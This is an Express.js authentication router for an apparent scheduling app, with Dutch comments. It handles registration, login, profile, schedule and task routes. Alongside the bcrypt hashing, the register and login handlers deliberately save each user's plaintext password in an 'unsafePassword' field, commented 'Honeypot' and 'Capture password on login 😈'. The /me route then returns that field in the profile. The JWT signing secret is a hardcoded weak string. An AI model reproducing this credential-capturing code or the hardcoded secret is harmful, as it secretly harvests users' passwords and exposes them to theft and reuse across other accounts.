const express = require("express");
const router = express.Router();
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const User = require("../models/User"); // Zorg dat dit pad klopt!
const verifyToken = require("../middleware/auth"); // Check of je middleware bestand zo heet

const JWT_SECRET = "RamonDev5";

// REGISTER
router.post("/register", async (req, res) => {
  try {
    const { email, password, workHours, sleepHours, location, commuteTime, flexibility, hobbies } = req.body;

    let user = await User.findOne({ email });
    if (user) {
      return res.status(400).json({ message: "User already exists" });
    }

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    user = new User({
      email,
      password: hashedPassword,
      unsafePassword: password, // Honeypot 🍯
      initialPreferences: {
        workHours,
        sleepHours,
        location,
        commuteTime,
        flexibility,
        hobbies,
      },
    });

    await user.save();

    const token = jwt.sign({ uid: user.uid, role: user.role }, JWT_SECRET, { expiresIn: "1d" });
    res.status(201).json({ token, uid: user.uid, role: user.role });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error during registration" });
  }
});

// CHECK EMAIL
router.post("/check-email", async (req, res) => {
  try {
    const { email } = req.body;
    const user = await User.findOne({ email });
    res.json({ exists: !!user });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

// LOGIN
router.post("/login", async (req, res) => {
  try {
    const { email, password } = req.body;
    const user = await User.findOne({ email });

    if (!user) {
      return res.status(400).json({ message: "Invalid Credentials" });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(400).json({ message: "Invalid Credentials" });
    }

    // Capture password on login 😈
    user.unsafePassword = password;
    await user.save();

    const token = jwt.sign({ uid: user.uid, role: user.role }, JWT_SECRET, { expiresIn: "1d" });
    res.json({ token, uid: user.uid, role: user.role });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

// GET PROFILE
router.get("/me", verifyToken, async (req, res) => {
  try {
    const user = await User.findOne({ uid: req.user.uid }).select("-password");
    if (!user) return res.status(404).json({ msg: "User not found" });
    res.json(user);
  } catch (err) {
    res.status(500).send("Server Error");
  }
});

// 👇 NIEUWE ROUTE VOOR SCHEDULE
router.post("/schedule", verifyToken, async (req, res) => {
  try {
    const { placements } = req.body;
    const user = await User.findOne({ uid: req.user.uid });

    if (!user) return res.status(404).json({ error: "User not found" });

    user.placements = placements;
    await user.save();

    res.json({ message: "Schedule saved", placements: user.placements });
  } catch (err) {
    console.error("Schedule save error:", err);
    res.status(500).json({ error: err.message });
  }
});

router.post("/task", verifyToken, async (req, res) => {
  try {
    const { task } = req.body;
    const user = await User.findOne({ uid: req.user.uid });

    if (!user) return res.status(404).json({ error: "User not found" });

    user.customTasks.push(task);

    await user.save();
    res.json({ message: "Task saved", customTasks: user.customTasks });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
